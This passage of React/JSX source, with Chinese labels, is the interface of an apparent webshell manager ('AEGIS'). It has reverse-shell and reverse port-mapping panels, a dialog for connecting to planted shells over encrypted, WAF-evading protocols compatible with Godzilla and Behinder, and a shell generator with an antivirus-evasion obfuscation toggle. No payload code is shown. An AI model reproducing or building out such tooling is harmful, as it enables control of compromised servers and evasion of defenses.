                        className="flex-1 flex items-center justify-center gap-1 rounded border border-red-400/40 bg-red-400/10 py-1.5 text-xs text-red-400 hover:bg-red-400/20">
                        <Square size={10} /> 停止
                      </button>
                    </div>
                    <div className="text-[10px] text-slate-500 font-medium mt-2">活跃会话</div>
                    {bshellSessions.length === 0 ? (
                      <div className="text-[10px] text-slate-600 py-2">暂无连接</div>
                    ) : bshellSessions.map(s => (
                      <button key={s} onClick={() => { setBshellSelected(s); setBshellOutput('') }}
                        className={`w-full text-left px-2 py-1.5 rounded border text-[11px] font-mono truncate ${bshellSelected === s ? 'border-cyber/40 bg-cyber/10 text-cyber' : 'border-line text-slate-400 hover:text-slate-200'}`}>
                        {s}
                      </button>
                    ))}
                    <div className="rounded border border-amber-400/20 bg-amber-400/5 p-2 text-[10px] text-amber-300/60 space-y-1">
                      <p>目标运行反弹Shell到目标上的该端口，PHP 监听并通过 Session 中继。</p>
                    </div>
                  </div>
                  {/* 右侧交互 */}
                  <div className="flex flex-col flex-1 overflow-hidden">
                    <div className="flex items-center gap-2 px-3 py-1.5 border-b border-line flex-shrink-0">
                      <span className="text-[11px] text-slate-400 font-mono">{bshellSelected || '未选择会话'}</span>
                      <button onClick={refreshBshellOutput} disabled={!bshellSelected}
                        className="ml-auto p-1 rounded hover:bg-base-600/50 text-slate-500 disabled:opacity-30">
                        <RefreshCw size={11} />
                      </button>
                    </div>
                    <div className="flex-1 overflow-y-auto p-3 font-mono text-xs text-slate-300 bg-black/50 whitespace-pre-wrap break-all">
                      {bshellOutput || <span className="text-slate-600">// 选择会话后在此交互</span>}
                    </div>
                    <form onSubmit={e => { e.preventDefault(); bshellSend() }}
                      className="flex items-center gap-2 px-3 py-2 border-t border-line bg-base-900/60 flex-shrink-0">
                      <span className="font-mono text-slate-600 text-xs">$</span>
                      <input value={bshellInput} onChange={e => setBshellInput(e.target.value)}
                        disabled={!bshellSelected}
                        placeholder={bshellSelected ? '输入命令…' : '请先选择会话'}
                        className="flex-1 bg-transparent font-mono text-xs text-slate-200 outline-none placeholder:text-slate-600 disabled:opacity-50" />
                      <button type="submit" disabled={!bshellSelected || !bshellInput}
                        className="rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-cyber hover:bg-cyber/20 disabled:opacity-40">
                        <ChevronRight size={14} />
                      </button>
                    </form>
                  </div>
                </div>
              )}

              {/* ── 反向端口映射 ReversePortMap ── */}
              {tab === 'revportmap' && (
                <div className="flex h-full">
                  {/* 左侧控制 */}
                  <div className="w-56 flex-shrink-0 border-r border-line p-3 space-y-3 overflow-y-auto">
                    <div className="text-[10px] text-slate-500 font-medium uppercase tracking-wide">反向端口映射</div>
                    <div>
                      <label className="block text-[10px] text-slate-500 mb-1">目标监听端口</label>
                      <input value={rpmPort} onChange={e => setRpmPort(e.target.value)}
                        className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                    </div>
                    <div className="flex gap-1.5">
                      <button onClick={startRevPortMap}
                        disabled={selected.status !== 'online'}
                        className="flex-1 flex items-center justify-center gap-1 rounded border border-emerald-400/40 bg-emerald-400/10 py-1.5 text-xs text-emerald-400 hover:bg-emerald-400/20 disabled:opacity-40">
                        <Play size={10} /> 创建
                      </button>
                      <button onClick={stopRevPortMap}
                        className="flex-1 flex items-center justify-center gap-1 rounded border border-red-400/40 bg-red-400/10 py-1.5 text-xs text-red-400 hover:bg-red-400/20">
                        <Square size={10} /> 停止
                      </button>
                    </div>
                    <div className="text-[10px] text-slate-500 font-medium mt-2">内网连接</div>
                    {rpmSessions.length === 0 ? (
                      <div className="text-[10px] text-slate-600 py-2">暂无连接</div>
                    ) : rpmSessions.map(s => (
                      <button key={s} onClick={() => { setRpmSelected(s); setRpmOutput('') }}
                        className={`w-full text-left px-2 py-1.5 rounded border text-[11px] font-mono truncate ${rpmSelected === s ? 'border-cyber/40 bg-cyber/10 text-cyber' : 'border-line text-slate-400 hover:text-slate-200'}`}>
                        {s.replace('reverseportmap_socket_', '')}
                      </button>
                    ))}
                    <div className="rounded border border-amber-400/20 bg-amber-400/5 p-2 text-[10px] text-amber-300/60 space-y-1">
                      <p>PHP 在目标绑定端口，内网服务连入后可通过此界面读写数据。</p>
                    </div>
                  </div>
                  {/* 右侧交互 */}
                  <div className="flex flex-col flex-1 overflow-hidden">
                    <div className="flex items-center gap-2 px-3 py-1.5 border-b border-line flex-shrink-0">
                      <span className="text-[11px] text-slate-400 font-mono">
                        {rpmSelected ? rpmSelected.replace('reverseportmap_socket_', '') : '未选择连接'}
                      </span>
                    </div>
                    <div className="flex-1 overflow-y-auto p-3 font-mono text-xs text-slate-300 bg-black/50 whitespace-pre-wrap break-all">
                      {rpmOutput || <span className="text-slate-600">// 选择内网连接后在此读写</span>}
                    </div>
                    <form onSubmit={e => { e.preventDefault(); rpmSend() }}
                      className="flex items-center gap-2 px-3 py-2 border-t border-line bg-base-900/60 flex-shrink-0">
                      <span className="font-mono text-slate-600 text-xs">{'>'}</span>
                      <input value={rpmInput} onChange={e => setRpmInput(e.target.value)}
                        disabled={!rpmSelected}
                        placeholder={rpmSelected ? '输入数据…' : '请先选择连接'}
                        className="flex-1 bg-transparent font-mono text-xs text-slate-200 outline-none placeholder:text-slate-600 disabled:opacity-50" />
                      <button type="submit" disabled={!rpmSelected || !rpmInput}
                        className="rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-cyber hover:bg-cyber/20 disabled:opacity-40">
                        <ChevronRight size={14} />
                      </button>
                    </form>
                  </div>
                </div>
              )}

            </div>
          </>
        )}
      </div>

      {/* ── 添加 Shell 弹窗 ── */}
      {addOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="w-[420px] rounded-xl border border-line bg-base-800 p-5 shadow-2xl">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
                <Terminal size={15} className="text-cyber" /> 添加 Webshell
              </h3>
              <button onClick={() => setAddOpen(false)} className="text-slate-500 hover:text-slate-200">
                <X size={16} />
              </button>
            </div>
            <div className="space-y-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Shell URL <span className="text-red-400">*</span></label>
                <input value={form.url} onChange={e => setForm(f => ({ ...f, url: e.target.value }))}
                  placeholder="http://target.com/shell.php"
                  className="w-full rounded border border-line bg-base-700/60 px-3 py-2 font-mono text-sm text-slate-200 outline-none focus:border-cyber" />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs text-slate-400 mb-1">Shell 类型</label>
                  <select value={form.shellType} onChange={e => setForm(f => ({ ...f, shellType: e.target.value }))}
                    className="w-full rounded border border-line bg-base-700/60 px-3 py-2 text-sm text-slate-200 outline-none focus:border-cyber">
                    <option value="php">PHP</option>
                    <option value="jsp">JSP</option>
                    <option value="aspx">ASPX</option>
                    <option value="asp">ASP</option>
                    <option value="python">Python (CGI)</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs text-slate-400 mb-1">密码</label>
                  <input value={form.password} onChange={e => setForm(f => ({ ...f, password: e.target.value }))}
                    placeholder="aegis"
                    className="w-full rounded border border-line bg-base-700/60 px-3 py-2 font-mono text-sm text-slate-200 outline-none focus:border-cyber" />
                </div>
              </div>
              <div>
                <label className="block text-xs text-slate-400 mb-1">传输协议</label>
                <select value={form.protocol} onChange={e => setForm(f => ({ ...f, protocol: e.target.value }))}
                  className="w-full rounded border border-line bg-base-700/60 px-3 py-2 text-sm text-slate-200 outline-none focus:border-cyber">
                  <optgroup label="── AEGIS 自研协议 ──">
                    <option value="default_aes">default_aes — AES-128-ECB（AEGIS标准，推荐）</option>
                    <option value="aes_gcm">aes_gcm — AES-256-GCM（最强，AEAD完整性）</option>
                    <option value="default_aes_form">default_aes_form — FORM表单伪装+AES（绕WAF body检测）</option>
                    <option value="default_xor">default_xor — 纯 XOR 流（最轻量）</option>
                    <option value="default_xor_base64">default_xor_base64 — XOR + Base64</option>
                    <option value="default_image">default_image — 伪装 PNG 图片 + AES</option>
                    <option value="default_json">default_json — JSON 包裹 + AES</option>
                    <option value="aes_with_magic">aes_with_magic — 随机魔法前缀 + AES</option>
                  </optgroup>
                  <optgroup label="── 哥斯拉 兼容模式 ──">
                    <option value="godzilla_php_aes">godzilla_php_aes — 哥斯拉v4 PHP AES（可连哥斯拉部署的Shell）</option>
                  </optgroup>
                  <optgroup label="── 冰蝎 兼容模式 ──">
                    <option value="behinder_v3">behinder_v3 — 冰蝎v3 内置模式（php://input 原始流）</option>
                    <option value="behinder_v4">behinder_v4 — 冰蝎v4 真实协议（form表单传参，可连冰蝎v4部署的Shell）</option>
                  </optgroup>
                </select>
                {(form.shellType !== 'php' && form.shellType !== 'python') && (
                  <p className="mt-1 text-[10px] text-amber-400/80">JSP/ASPX/ASP 的传输协议由 Shell 自身固定，此选项仅影响生成的 PHP 代码</p>
                )}
                {form.shellType === 'python' && (
                  <p className="mt-1 text-[10px] text-emerald-400/80">Python Shell 仅支持 default_aes 和 aes_gcm 协议</p>
                )}
                {(form.protocol === 'godzilla_php_aes' || form.protocol === 'behinder_v4') && (
                  <p className="mt-1 text-[10px] text-emerald-400/80">兼容模式：AEGIS 将使用目标工具协议连接，填入目标 Shell 的原始密码即可</p>
                )}
              </div>
              <div>
                <label className="block text-xs text-slate-400 mb-1">自定义请求头</label>
                <textarea
                  value={form.customHeaders}
                  onChange={e => setForm(f => ({ ...f, customHeaders: e.target.value }))}
                  placeholder={"请输入 Key: Value 格式，一行一个，例如：\nUser-Agent: Mozilla/5.0\nX-Forwarded-For: 127.0.0.1"}
                  rows={3}
                  className="w-full rounded border border-line bg-base-700/60 px-3 py-2 font-mono text-xs text-slate-200 outline-none focus:border-cyber resize-none"
                />
                <p className="mt-0.5 text-[10px] text-slate-600">留空使用默认请求头 · 自定义头会覆盖同名默认值（如 User-Agent）</p>
              </div>
              <div>
                <label className="block text-xs text-slate-400 mb-1">备注</label>
                <input value={form.note} onChange={e => setForm(f => ({ ...f, note: e.target.value }))}
                  placeholder="目标描述（可选）"
                  className="w-full rounded border border-line bg-base-700/60 px-3 py-2 text-sm text-slate-200 outline-none focus:border-cyber" />
              </div>
              <div className="rounded border border-line/50 bg-base-700/20 p-2.5 text-[11px] text-slate-500">
                Key = MD5(密码) 前16位十六进制 · PHP 全部协议支持主动连接 · JSP/ASPX/ASP 可生成代码部署，主动连接功能开发中
              </div>
            </div>
            <div className="flex gap-2 mt-4">
              <button onClick={addShell} disabled={adding || !form.url.trim()}
                className="flex-1 rounded border border-cyber/40 bg-cyber/10 px-4 py-2 text-sm text-cyber hover:bg-cyber/20 disabled:opacity-40">
                {adding ? '添加中…' : '确认添加'}
              </button>
              <button onClick={() => setAddOpen(false)}
                className="px-4 py-2 rounded border border-line text-sm text-slate-400 hover:text-slate-200">
                取消
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Shell 代码生成器弹窗 ── */}
      {codeGenOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="w-[580px] max-h-[82vh] rounded-xl border border-line bg-base-800 p-5 shadow-2xl flex flex-col">
            <div className="flex items-center justify-between mb-4 flex-shrink-0">
              <h3 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
                <Code2 size={15} className="text-cyber" /> Shell 代码生成器
              </h3>
              <button onClick={() => setCodeGenOpen(false)} className="text-slate-500 hover:text-slate-200">
                <X size={16} />
              </button>
            </div>

            <div className="grid grid-cols-3 gap-3 flex-shrink-0">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Shell 类型</label>
                <select value={codeGenType} onChange={e => setCodeGenType(e.target.value)}
                  className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 text-sm text-slate-200 outline-none focus:border-cyber">
                  <option value="php">PHP</option>
                  <option value="asp">ASP (VBScript)</option>
                  <option value="jsp">JSP (Java)</option>
                  <option value="aspx">ASPX (.NET)</option>
                  <option value="python">Python (CGI)</option>
                </select>
              </div>
              <div>
                <label className="block text-xs text-slate-400 mb-1">密码</label>
                <input value={codeGenPassword} onChange={e => setCodeGenPassword(e.target.value)}
                  placeholder="aegis"
                  className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 font-mono text-sm text-slate-200 outline-none focus:border-cyber" />
              </div>
              {codeGenType === 'php' ? (
                <div>
                  <label className="block text-xs text-slate-400 mb-1">传输协议</label>
                  <select value={codeGenProtocol} onChange={e => setCodeGenProtocol(e.target.value)}
                    className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 text-xs text-slate-200 outline-none focus:border-cyber">
                    <optgroup label="AEGIS 自研">
                      <option value="default_aes">default_aes（推荐）</option>
                      <option value="aes_gcm">aes_gcm（最强）</option>
                      <option value="default_aes_form">default_aes_form（FORM伪装）</option>
                      <option value="default_xor">default_xor</option>
                      <option value="default_xor_base64">default_xor_base64</option>
                      <option value="default_image">default_image</option>
                      <option value="default_json">default_json</option>
                      <option value="aes_with_magic">aes_with_magic</option>
                    </optgroup>
                    <optgroup label="哥斯拉兼容">
                      <option value="godzilla_php_aes">godzilla_php_aes</option>
                    </optgroup>
                    <optgroup label="冰蝎兼容">
                      <option value="behinder_v3">behinder_v3</option>
                      <option value="behinder_v4">behinder_v4</option>
                    </optgroup>
                  </select>
                </div>
              ) : codeGenType === 'python' ? (
                <div>
                  <label className="block text-xs text-slate-400 mb-1">传输协议</label>
                  <select value={codeGenProtocol} onChange={e => setCodeGenProtocol(e.target.value)}
                    className="w-full rounded border border-line bg-base-700/60 px-2 py-1.5 text-xs text-slate-200 outline-none focus:border-cyber">
                    <option value="default_aes">default_aes — AES-128-ECB（推荐）</option>
                    <option value="aes_gcm">aes_gcm — AES-256-GCM（最强）</option>
                  </select>
                </div>
              ) : (
                <div className="flex items-end pb-0.5">
                  <span className="text-[11px] text-slate-500">
                    {codeGenType === 'asp' ? 'XOR 加密（固定）' : 'AES-128-ECB（固定）'}
                  </span>
                </div>
              )}
            </div>

            {/* 混淆开关（PHP only） */}
            {codeGenType === 'php' && (
              <div className="mt-2 flex-shrink-0 flex items-center gap-2">
                <button
                  onClick={() => { const n = !codeGenObfuscate; setCodeGenObfuscate(n); genStandaloneCode(codeGenType, codeGenProtocol, codeGenPassword, n) }}
                  className={`flex items-center gap-1.5 rounded border px-2.5 py-1 text-xs transition ${codeGenObfuscate ? 'border-purple-400/50 bg-purple-400/10 text-purple-300' : 'border-line text-slate-500 hover:text-slate-300'}`}>
                  <Zap size={11} /> {codeGenObfuscate ? '免杀混淆 ON' : '免杀混淆'}
                </button>
                {codeGenObfuscate && (
                  <span className="text-[10px] text-purple-400/60">随机变量名 + 字符串分割，每次生成不同特征</span>
                )}
              </div>
            )}

            {codeGenDesc && !codeGenLoading && (
              <div className="mt-2 flex-shrink-0 rounded border border-cyber/20 bg-cyber/5 px-3 py-1.5 text-[11px] text-cyber/80 font-mono">
                {codeGenDesc}
              </div>
            )}

            <div className="mt-2 flex-1 min-h-0 flex flex-col overflow-hidden rounded border border-line bg-black/60">
              <div className="flex items-center justify-between px-3 py-1.5 border-b border-line flex-shrink-0">
                <span className="text-[11px] text-slate-500 font-mono">
                  {codeGenType === 'php' ? 'shell.php' : codeGenType === 'asp' ? 'shell.asp' : codeGenType === 'jsp' ? 'shell.jsp' : codeGenType === 'python' ? 'shell.py' : 'shell.aspx'}
                </span>
                <div className="flex items-center gap-2">
                  {codeGenLoading && <RefreshCw size={10} className="animate-spin text-slate-500" />}
                  <button
                    onClick={() => navigator.clipboard.writeText(codeGenCode).then(() => {
                      setCodeGenCopied(true); setTimeout(() => setCodeGenCopied(false), 2000)
                    })}
                    disabled={!codeGenCode || codeGenLoading}
                    className="flex items-center gap-1 text-[10px] text-slate-500 hover:text-slate-300 disabled:opacity-40">
                    {codeGenCopied ? <><Check size={10} className="text-emerald-400" /> 已复制</> : <><Copy size={10} /> 复制代码</>}
                  </button>
                </div>
              </div>
              <pre className="flex-1 overflow-auto p-4 font-mono text-xs text-slate-300 whitespace-pre-wrap break-all leading-relaxed">
                {codeGenLoading
                  ? <span className="text-slate-500 animate-pulse">生成中…</span>
                  : codeGenCode || <span className="text-slate-600">// 输入配置后自动生成</span>}
              </pre>
            </div>

            {JSP_ASPX_PARTIAL.has(codeGenType) && (
              <div className="mt-3 flex-shrink-0 rounded border border-amber-400/20 bg-amber-400/5 p-2.5 text-[11px] text-amber-300/70">
                ⚠ {codeGenType.toUpperCase()} 传输协议已实现，主动连接（命令执行/文件管理）需预编译字节码，功能开发中。
              </div>
            )}

            <div className="mt-3 flex items-center justify-between flex-shrink-0">
              <p className="text-[11px] text-slate-600">部署代码后，点击「添加连接」填写目标 URL 完成接入</p>
              <div className="flex gap-2">
                <button onClick={() => setCodeGenOpen(false)}
                  className="rounded border border-line px-3 py-1.5 text-xs text-slate-400 hover:text-slate-200">
                  关闭
                </button>
                <button onClick={() => {
                  setCodeGenOpen(false)
                  setForm(f => ({ ...f, shellType: codeGenType, protocol: codeGenProtocol, password: codeGenPassword }))
                  setAddOpen(true)
                }}
                  className="flex items-center gap-1.5 rounded border border-cyber/40 bg-cyber/10 px-3 py-1.5 text-xs text-cyber hover:bg-cyber/20">
                  <Plus size={12} /> 添加连接
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── 备注编辑弹窗 ── */}
      {editNote && selected && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="w-80 rounded-xl border border-line bg-base-800 p-5 shadow-2xl">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-sm font-semibold text-slate-100">编辑备注</h3>
              <button onClick={() => setEditNote(false)} className="text-slate-500 hover:text-slate-200">
                <X size={15} />
              </button>
            </div>
            <input value={noteText} onChange={e => setNoteText(e.target.value)}
              placeholder="输入备注…"
              className="w-full rounded border border-line bg-base-700/60 px-3 py-2 text-sm text-slate-200 outline-none focus:border-cyber" />
            <div className="flex gap-2 mt-3">
              <button onClick={saveNote}
                className="flex-1 rounded border border-cyber/40 bg-cyber/10 px-3 py-1.5 text-xs text-cyber hover:bg-cyber/20">
                保存
              </button>
              <button onClick={() => setEditNote(false)}
                className="px-3 py-1.5 rounded border border-line text-xs text-slate-400 hover:text-slate-200">
                取消
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  )
}
